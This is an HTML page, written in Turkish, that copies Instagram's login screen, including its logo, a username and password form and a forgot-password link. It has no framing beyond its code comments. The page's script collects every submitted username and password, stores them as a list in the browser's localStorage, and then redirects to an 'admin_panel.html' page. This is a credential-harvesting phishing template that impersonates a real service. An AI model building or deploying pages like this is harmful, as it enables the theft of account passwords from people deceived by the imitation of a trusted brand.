<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Giriş</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-panel {
            background: #fff;
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 10px;
            width: 100%;
            max-width: 350px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .login-panel img {
            width: 120px;
            margin-bottom: 20px;
        }
        .login-panel h1 {
            font-size: 24px;
            color: #333;
            margin: 0;
        }
        .login-panel input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            box-sizing: border-box;
        }
        .login-panel button {
            width: 100%;
            padding: 12px;
            background: #3897f0;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background 0.3s ease;
        }
        .login-panel button:hover {
            background: #2d80e0;
        }
        .login-panel a {
            text-decoration: none;
            color: #3897f0;
            font-size: 14px;
            display: block;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-panel">
        <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo">
        <h1>Instagram</h1>
        <form id="login-form">
            <input type="text" id="username" placeholder="Kullanıcı Adı" required>
            <input type="password" id="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
            <a href="#">Şifreni mi unuttun?</a>
        </form>
    </div>

    <script>
        // Form submit olduğunda çalışacak fonksiyon
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault(); // Formun otomatik olarak gönderilmesini engeller

            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            // localStorage'dan önceki kullanıcı verilerini al
            var userCredentials = JSON.parse(localStorage.getItem('users')) || [];

            // Yeni kullanıcıyı ekle
            userCredentials.push({ username: username, password: password });

            // Kullanıcı bilgilerini localStorage'a kaydet
            localStorage.setItem('users', JSON.stringify(userCredentials));

            // Admin paneline yönlendir
            window.location.href = 'admin_panel.html';
        });
    </script>
</body>
</html>
